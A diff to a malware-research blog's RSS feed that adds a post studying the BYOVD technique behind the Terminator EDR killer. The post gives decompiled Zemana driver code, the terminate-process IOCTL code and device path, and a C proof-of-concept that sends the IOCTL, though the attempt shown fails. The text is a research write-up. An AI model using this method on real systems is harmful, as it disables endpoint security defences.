@@ -3,11 +3,307 @@
   <channel>
     <title>Malware Owl</title>
     <description>Malware Owl Blog on the Journey</description>
-    <link>https://Owl4444.github.io/</link>
-    <atom:link href="https://owl4444.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sat, 25 Mar 2023 20:29:33 +0000</pubDate>
-    <lastBuildDate>Sat, 25 Mar 2023 20:29:33 +0000</lastBuildDate>
+    <link>http://0.0.0.0:8000/</link>
+    <atom:link href="http://0.0.0.0:8000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Tue, 13 Jun 2023 14:19:08 +0000</pubDate>
+    <lastBuildDate>Tue, 13 Jun 2023 14:19:08 +0000</lastBuildDate>
     <generator>Jekyll v4.2.2</generator>
+    
+      <item>
+        <title>Quick Study of Bring Your Own Vulnerable Driver (BYOVD)</title>
+        <description>&lt;h1 id=&quot;quick-study-of-bring-your-own-vulnerable-driver-byovd&quot;&gt;Quick Study of Bring Your Own Vulnerable Driver (BYOVD)&lt;/h1&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Yesterday, I came across a concept in Twitter known as Bring Your Own Vulnerable Driver (BYOVD). Intrigued by this notion, I have decided to delve into an example to learn some details and intricacies of BYOVD.&lt;/p&gt;
+
+&lt;p&gt;This little quest led me to an article published by SC Magazine which explains a little more about this concept. According to the artcile titled “Novel Terminator Antivirus Killer Found to Be a BYOVD Attack”, there was a recent emergence of an attack that was initially dubbed “Novel Terminator Antirus Killer”. The attack, attributed to threat actor, Spyboy, was subsequently discovered to be an instance of BYOVD. As the name implies, it involves the utilization of existing administrative permissions to deploy a legitimately-signed but vulnerable driver. In the case of the Novel Terminator Antivirus Killer, the driver in question is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zam64.sys&lt;/code&gt;. The malware, having been granted administrative privilege, exploits the vulnerability present in it. As a result, it is abused by terminating an extensive array of established Endpoint Detection and Response (EDR), Extended Detection and Response (XDR), and Antivirus (AV) solutions.&lt;/p&gt;
+
+&lt;p&gt;Interestingly, ZeroMemoryEx has reproduced Spyboy technique as seen in &lt;a href=&quot;https://github.com/ZeroMemoryEx/Terminator&quot;&gt;https://github.com/ZeroMemoryEx/Terminator&lt;/a&gt;. It also details that the vulnerable driver can be downloaded from &lt;a href=&quot;https://www.loldrivers.io/drivers/49920621-75d5-40fc-98b0-44f8fa486dcc/&quot;&gt;https://www.loldrivers.io/drivers/49920621-75d5-40fc-98b0-44f8fa486dcc/&lt;/a&gt; and a quick technical detail.&lt;/p&gt;
+
+&lt;h2 id=&quot;environment&quot;&gt;Environment&lt;/h2&gt;
+
+&lt;p&gt;This study is conducted on Windows 10 Version 20H2. Choice of debugger is WinDBG for kernel debugging.&lt;/p&gt;
+
+&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
+&lt;p&gt;Terminator.sys is a legitimate but vulnerable driver from Zemana AntiMalware. It has abilities to terminate of process by PID. Legitimately, I believe that if Zemana AntiMalware detects a malicious process, it would terminate it via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_TERMINATE_PROCESS&lt;/code&gt; control code by processes that is trusted. To be known as a trusted process by Zemana AntiMalware, the trusted process’ PID has to be registered. I have also tried to go into the motion of writing a POC to see how this vulnerability could have been found as well.&lt;/p&gt;
+
+&lt;h2 id=&quot;root-cause&quot;&gt;Root Cause&lt;/h2&gt;
+&lt;p&gt;This registration can be easily done via another Device Control Code &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_REGISTER_PROCESS&lt;/code&gt; assuming you have administrative privilege. Furthermore, there is no checks on which process is calling sending this code which makes it possible for any privileged process to register itself. Once registered, it can now send &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_TERMINATE_PROCESS&lt;/code&gt; to terminate any process as long as the PID is provided with the input.&lt;/p&gt;
+
+&lt;h2 id=&quot;reverse-engineering&quot;&gt;Reverse Engineering&lt;/h2&gt;
+&lt;p&gt;Upon deployment, driver would initialize, create device object and verify itself. Additionally, major functions of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DriverObject&lt;/code&gt; are initialized.&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;memset64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DriverObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MajorFunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub_14001147C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1Cu&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DriverObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MajorFunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IRP_MJ_CREATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PDRIVER_DISPATCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub_14001049C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DriverObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MajorFunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IRP_MJ_CLOSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PDRIVER_DISPATCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub_14001049C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DriverObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MajorFunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IRP_MJ_DEVICE_CONTROL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PDRIVER_DISPATCH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub_1400104BC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DriverObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DriverUnload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PDRIVER_UNLOAD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sub_140011384&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IoCreateDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DriverObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x22u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Index 14 corresponds to IRP_MJ_DEVICE_CONTROL, which is used for custom device control operations.This means that this function relies on Control Codes specific for device control operations. For more details, refer to &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/creating-ioctl-requests-in-drivers&quot;&gt;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/creating-ioctl-requests-in-drivers&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Without knowing the context, the most flavorful IOCTL, based on the article, should be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_TERMINATE_PROCESS&lt;/code&gt;. For this study, this is where I first looked at since the goal would be to terminate security solutions. We can find that in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_1400104BC&lt;/code&gt; which is assigned to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IRP_MJ_DEVICE_CONTROL&lt;/code&gt; index. We can also determine the control code to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x80002048&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quickstudyBYOVD//IOCTL_TERMINATE_PROCESS.png&quot; alt=&quot;/images/quickstudyBYOVD//IOCTL_TERMINATE_PROCESS.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;attempt-to-terminate-notepad-failed&quot;&gt;Attempt to Terminate Notepad (Failed)&lt;/h2&gt;
+
+&lt;p&gt;To send control codes, we can make use of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DeviceIoControl&lt;/code&gt; function.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;dwIoControlCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optional&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;lpInBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;nInBufferSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optional&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;lpOutBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;nOutBufferSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optional&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;LPDWORD&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;lpBytesReturned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optional&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LPOVERLAPPED&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpOverlapped&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;According to MSDN, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hDevice&lt;/code&gt; is a handle to the device on which the operation is to be performed. The device is typically a volume, directory, file or stream. To retrieve a device hadnle, use the CreateFile function. First thing we can try to do this is to look for named pipes in winDBG via the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!handle&lt;/code&gt; command.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quickstudyBYOVD//handle.png&quot; alt=&quot;handle.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see the SymbolicLink for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZemanaAntiMalware&lt;/code&gt;. We can get more information about it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!object &amp;lt;handle address&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quickstudyBYOVD//handleobjectdetails.png&quot; alt=&quot;handleobjectdetails.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Since the target string is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\Device\ZemanaAntiMalware&lt;/code&gt;, the created file should have the named pipe of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\.\ZemanaAntiMalware&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The following script built and ran with administrative privilege. Furthermore, the PID of the opened notepad is included in the script and make sure that Terminator has been successfully deployed into the target machine.&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LONGLONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOCTL_TERMINATE_PROCESS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80002048&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PID_TO_TERMINATE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3524&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Hardcoded PID ( change each time )&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytesReturned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// Open a handle to the device through the symbolic link&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CreateFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ZemanaAntiMalware&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;GENERIC_READ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GENERIC_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;OPEN_EXISTING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;FILE_ATTRIBUTE_NORMAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INVALID_HANDLE_VALUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to open handle to device. Error: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetLastError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// Send control code IOCTL_TERMINATE_PROCESS to the driver&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PID_TO_TERMINATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOCTL_TERMINATE_PROCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytesReturned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to Terminate PID %d via control code. Error: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PID_TO_TERMINATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetLastError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Successfully terminated PID %d sent control code.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PID_TO_TERMINATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// Close the handle&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;CloseHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Upon running, I was greeted with the following error.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Failed to Terminate PID 3524 via Control code. Error: 5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;debugging-the-failure&quot;&gt;Debugging the Failure&lt;/h2&gt;
+
+&lt;p&gt;First thing to verify is to check if the Control Code has been received.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bu Terminator+0x1054C
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quickstudyBYOVD//check_control_code_terminate_process.png&quot; alt=&quot;/images/quickstudyBYOVD//check_control_code_terminate_process.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Running the exectuble would cause the breakpoint to be hit. We can also verify that the control code &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_TERMINATE_PROCESS&lt;/code&gt; is received by the driver as well.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/quickstudyBYOVD//IOCTL_TERMINATE_PROCESS_RECEIVED.png&quot; alt=&quot;IOCTL_TERMINATE_PROCESS_RECEIVED.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next thing to verify is to check if the block for terminating process has been reached.&lt;/p&gt;
